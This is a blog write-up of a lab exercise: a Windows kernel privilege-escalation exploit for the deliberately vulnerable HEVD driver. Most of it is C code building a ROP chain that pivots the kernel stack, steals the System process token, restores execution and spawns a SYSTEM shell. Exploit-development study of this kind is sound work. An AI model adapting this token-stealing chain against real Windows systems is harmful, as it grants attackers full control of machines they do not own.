[Home](https://plackyhacker.github.io)

# HEVD Double-fetch Privilege Escalation without Shellcode
       
## Introduction

Why am I revisiting the double-fetch in HEVD again?! The [first time](https://plackyhacker.github.io/kernel/race) I completed the challenge the end resullt was so dissatisfying, even though I got a privileged shell. The [second time](https://plackyhacker.github.io/kernel/double-fetch) was much better but I still wasn't 100% satisfied!

I amended the `cr4` register to bypass SMEP but that doesn't feel like a win. I don't know how reliable it is without knowing the `cr4` value in advance. Anyway I wanted to have another go, this time avoiding the execution of custom shellcode! WHAT? Without a read and write primitive? Yes, with the power of ROP! 

**Note:** I am not going to talk about the race condition as I have done that to death in the previous posts. If you are new to kernel exploitation, race conditions, stack pivots... etc. Please go read my other posts.

## Stack Pivoting

I learned previously that I had to overwrite the stack with as short a rop chain as possible so I could restore execution back to the stack and return to user mode with a privileged shell. So, around 5 or 6 gadgets to do the magic (In theory you can do this with one gadget). For this I needed to pivot to a fake stack in order to carry out the token stealing.

So I found myself a `mov esp, 0x...` gadget and allocated some memory for the fake stack:

```c
// stack pivot
QWORD STACK_PIVOT_ADDR = 0x83000000;

// prepare the new stack
QWORD stackAddr = STACK_PIVOT_ADDR - 0x1000;
LPVOID stack = VirtualAlloc((LPVOID)stackAddr, 0x14000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

printf("[+] User space stack, allocated address: 0x%p\n", stack);

if (!VirtualLock((LPVOID)stack, 0x14000)) {
   printf("[!] Error using VirtualLock. Error code: %u\n %d\n", GetLastError());
   return 1;
}
```

Here is the ROP chain that overwrites the kernel stack when the race condition is triggered:

```c
int index = 0;
char* offset = userBuffer + 0x808;
QWORD* rop = (QWORD*)offset;

*(rop + index++) = (QWORD)kernelBase + 0x31cd2e;			// push rsp ; pop rbp ; adc eax, 0x220F4400 ; ret ;
*(rop + index++) = (QWORD)kernelBase + 0x59f00e;			// mov esp, 0x83000000 ; ret ;
*(rop + index++) = INT3;                                    // padding, never gets hit
*(rop + index++) = INT3;                                    // padding, never gets hit
*(rop + index++) = INT3;                                    // padding, never gets hit
```

Notice that I store the value in `rsp` in `rbp`. This is so I can recover the stack later. The second gadget pivots the stack.

## The Beginnings of a ROP Chain

We start the next ROP chain on the fake stack:

```c
index = 0;
rop = (QWORD*)STACK_PIVOT_ADDR;

// stop the race thread, no longer needed
*(rop + index++) = (QWORD)kernelBase + 0x5f1535;			// pop rax ; ret ;
*(rop + index++) = (QWORD)&raceWon;                         // raceWon var address is now in rax
*(rop + index++) = (QWORD)kernelBase + 0x646305;			// pop rcx ; ret ;
*(rop + index++) = (QWORD)0x01;
*(rop + index++) = (QWORD)kernelBase + 0x233314;			// mov qword [rax], rcx ; ret ;
```

This first part sets a global variable `raceWon` in user-mode to `0x1` which stops the race thread from running, after all we have won the race and triggered the exploit (I have included the race thread for clarity):

```c
// this is the function trying to win the race
DWORD WINAPI ChangeStruct(void* args)
{
    while (!raceWon)
    {
        userData.sizeOfData = sizeOfBufferToOverflow;
        Sleep(10);
    }
    return NULL;
}
```

The next bit deals with taking the value in `rbp` and adding `0x58` to it as this is where we want to return to on the 'real' stack:

```c
// store the old stack pointer
QWORD aBuffer = 0x0;
printf("[+] aBuffer address: 0x%p\n", &aBuffer);

*(rop + index++) = kernelBase + 0x5f1535;			        // pop rax ; ret ;
*(rop + index++) = kernelBase + 0x5f1535;			        // pop rax ; ret ;
*(rop + index++) = kernelBase + 0x3de15e;			        // mov r8, rbp ; mov rcx, rdi ; call rax ;
*(rop + index++) = kernelBase + 0x9411ea;			        // mov rcx, r8 ; mov rax, rcx ; ret ;

// add  0x58 to the restored rsp
*(rop + index++) = kernelBase + 0x3d5c4a;			        // xchg rax, rcx ; ret ;
*(rop + index++) = kernelBase + 0x646305;			        // pop rcx ; ret ;
*(rop + index++) = (QWORD)0x58;     			            // 0x58
*(rop + index++) = kernelBase + 0x63ed4f;			        // add rax, rcx ; ret ;
*(rop + index++) = kernelBase + 0x3d5c4a;			        // xchg rax, rcx ; ret ;
*(rop + index++) = kernelBase + 0x5f1535;			        // pop rax ; ret ;
*(rop + index++) = (QWORD)&aBuffer;     			        // a buffer
*(rop + index++) = kernelBase + 0x233314;			        // mov qword [rax], rcx ; ret ;
```

It looks complicated, but it isn't. The value of the return address is stored in a local variable (`aBuffer`) for later. Also notice that I am using call-oriented programming (COP) due to a lack of gadgets (ref: ` mov r8, rbp ; mov rcx, rdi ; call rax ;`).

## Resolving the EPROCESS Address

For us to steal the `System` token we need to resolve our exploit process `EPROCESS` structure, the `System` process structure, steal the token from the `System` process, and apply it to the exploit `EPROCESS`. The first step is to resolve the `EPROCESS` address:

First we need to allocate some memory for the `PsLookupProcessByProcessId` call. The syntax for this call is:

```c
NTSTATUS PsLookupProcessByProcessId(
  [in]  HANDLE    ProcessId,
  [out] PEPROCESS *Process
);
```

We pop our `ProcessId` into `rcx`, and allocate a small buffer, and reference it in `rdx`; this is where the `EPROCESS` address will be written to. The ROP chain to allocate memory is shown below:

```c
// allocate some memory in the kernel (for use with PsLookupProcessByProcessId)
*(rop + index++) = kernelBase + 0x646305;			        // pop rcx ; ret ;
*(rop + index++) = 0x00;                                    // NonPagedPool
*(rop + index++) = kernelBase + 0x6481fa;			        // pop rdx ; ret ;
*(rop + index++) = 0x08;                                    // 0x8
for (DWORD i = 0; i < 5; i++)
    *(rop + index++) = ROP_NOP;                             // shadowspace
*(rop + index++) = kernelBase + 0x364040;                   // call ExAllocatePool
*(rop + index++) = kernelBase + 0x5ce5b5;	        		// add rsp, 0x28 ; ret ;
for (DWORD i = 0; i < 5; i++)
    *(rop + index++) = ROP_NOP;                             // junk
 
*(rop + index++) = kernelBase + 0x5d20d8;			        // push rax ; pop rdi ; ret ;
```

We have a buffer referenced in `rdi` which we can use in the `PsLookupProcessByProcessId` call:

```c
// resolve the current process address
*(rop + index++) = kernelBase + 0x646305;			        // pop rcx ; ret ;
*(rop + index++) = (QWORD)GetCurrentProcessId();            // the PID for this process
*(rop + index++) = (QWORD)kernelBase + 0x5f1535;			// pop rax ; ret ;
*(rop + index++) = (QWORD)kernelBase + 0x5f1535;			// pop rax ; ret ;
*(rop + index++) = kernelBase + 0x3d3195;			        // mov rdx, rdi ; call rax ;
for (DWORD i = 0; i < 5; i++)
    *(rop + index++) = ROP_NOP;                             // shadowspace

*(rop + index++) = kernelBase + 0x689130;                   // call PsLookupProcessByProcessId
```

Lastly we move the actual `EPROCESS` address referenced in `rdi` into `r10` for later, by derferencing it using `rax`:

```c
// rdi contains a pointer to the address of the current EPROCESS
*(rop + index++) = kernelBase + 0x661ca9;			        // mov rax, rdi ; add rsp, 0x20 ; pop rdi ; ret ;
for (DWORD i = 0; i < 5; i++)
    *(rop + index++) = ROP_NOP;                             // junk

*(rop + index++) = kernelBase + 0x9c5fa6;			        // mov rax, qword [rax] ; ret ;

*(rop + index++) = kernelBase + 0x98535d;			        // mov r10, rax ; mov rax, r10 ; add rsp, 0x28 ; ret ;
for (DWORD i = 0; i < 5; i++)
    *(rop + index++) = ROP_NOP;                             // junk
```

## Resolving the System EPROCESS Address

Thankfully the next part is a bit easier! The `System` `EPROCESS` is referenced in `ntoskrnl`, obviously the offset will change per OS build:

```c
// resolve the System EPROCESS address
*(rop + index++) = (QWORD)kernelBase + 0x646305;			// pop rcx ; ret ;
*(rop + index++) = (QWORD)kernelBase + 0xcfc420;            // PsInitialSystemProcess address
*(rop + index++) = kernelBase + 0x5ed216;			        // mov rax, qword [rcx] ; ret ;

// store the value in r8
*(rop + index++) = kernelBase + 0x5a2225;			        // mov r8, rax ; mov rax, r8 ; add rsp, 0x28 ; ret ;
for (DWORD i = 0; i < 5; i++)
    *(rop + index++) = ROP_NOP;                             // junk
```

Notice that `PsInitialSystemProcess` contains a reference to the `System` `EPROCESS`. We dereference it using `rax` and store the address in `r8`.

## Token Stealing

Finally, we have arrived at the juicy bit! Token theft!

The next bit we want to grab the actual `System` token value and move it into `r8`:

```c
// r10 contains the address of exploit EPROCESS
// r8 contains the address of System EPROCESS

*(rop + index++) = (QWORD)kernelBase + 0x5f1535;			// pop rax ; ret ;
*(rop + index++) = (QWORD)0x4b8;                            // Token offset
*(rop + index++) = kernelBase + 0x31ce9f;			        // add rax, r8 ; ret ;
*(rop + index++) = kernelBase + 0x9c5fa6;			        // mov rax, qword [rax] ; ret ;

// rax holds the system token value

// store the value in r8
*(rop + index++) = kernelBase + 0x5a2225;			        // mov r8, rax ; mov rax, r8 ; add rsp, 0x28 ; ret ;
for (DWORD i = 0; i < 5; i++)
    *(rop + index++) = ROP_NOP;                             // junk
```

To get this we basically add `0x4b8` (the offset from `EPROCESS` to the token value in this OS build), then dereference the address into `rax`.

Next we locate the address of the exploit token (adding `0x4b8`):

```c
*(rop + index++) = (QWORD)kernelBase + 0x5f1535;			// pop rax ; ret ;
*(rop + index++) = (QWORD)0x4b8;                            // Token offset
*(rop + index++) = kernelBase + 0x254427;			        // add rax, r10 ; ret ;

// rax points to the curret token
// r8 holds the system token value
```

We need to clear out the `refCount` of the token, which is the lowest 4 bits:

```c
// clear out _EX_FAST_REF RefCnt
*(rop + index++) = kernelBase + 0x5cfdd4;			        // pop r13 ; ret ;
*(rop + index++) = 0xfffffffffffffff0;                      // mask
*(rop + index++) = kernelBase + 0x5eccfa;			        // and r8L, r13L ; ret ;
```

All the pieces are in place. `rax` contains the address of the exploit token, and `r8` contains the sanitised token value stolen from `System`:

```c
// copy the system token to the current token address
*(rop + index++) = kernelBase + 0x328456;			        // mov qword [rax], r8 ; ret ;
```

## Restoring the Stack

Remember the value we stored for the original stack? We are going to use that here to pivot back from whence we came. As I did in the previous post I am pivoting the stack back to the next return value. I am also setting `rax` to `0xc0000001`, this is the return value `NT_STATUS_UNSUCCESSFUL`, which isn't that important for this exploit:

```c
// restore the stack
*(rop + index++) = (QWORD)kernelBase + 0x5f1535;			// pop rax ; ret ;
*(rop + index++) = (QWORD)0xc0000001;                       // ret value
*(rop + index++) = kernelBase + 0x646305;			        // pop rcx ; ret ;
*(rop + index++) = (QWORD)&aBuffer - 0x10; 			        // a buffer

*(rop + index++) = kernelBase + 0x6481fa;			        // pop rdx ; ret ;
*(rop + index++) = kernelBase + 0x5ce0dd;			        // ret ;
*(rop + index++) = kernelBase + 0x3fa46b;			        // mov rsp, qword [rcx+0x10] ; jmp rdx ;
```

One really important part is that I have to minus `0x10` from the `aBuffer` address (where the original stack address is), this is because the gadget that restores `rsp` uses a dereference of `rcx+0x10`. Also note that I have used jump-oriented programming (look at me eh!) That is why I popped a `ret` gadget into `rdx`.

## Privileged Shell

Once the kernel has returned back to our user-mode code we should be able to spawn a privileged shell:

```c
void SpawnShell()
{
    PrintTime(FALSE);
    printf("[+] Enjoy your shell...\n\n");
    system("cmd.exe");

    exit(0);
}
```

Fingers crossed... does it work? Of course it does, or why would I be writing about it!?

<img width="1059" style="border: 1px solid black;" alt="Screenshot 2024-08-26 at 16 35 32" src="https://github.com/user-attachments/assets/d6cf37eb-0747-4c65-aff4-c759f5eaa896">

## The End

[Here is the full code](https://github.com/plackyhacker/HEVD/blob/main/hevd_double_fetch_rop_only.cpp)

This post has been heavy on ROP. If you don't understand a lot of what's going on then please read the previous posts on this topic; this is the fifth or fourth (I've lost count) and I can't keep repeating myself. If you understand how the race condition is triggered and you understand ROP chains in general then you should be able to work through what's going on.

Yes, that is the end... no more double-fetch... in HEVD at least. Until next time... go away!

[Home](https://plackyhacker.github.io)
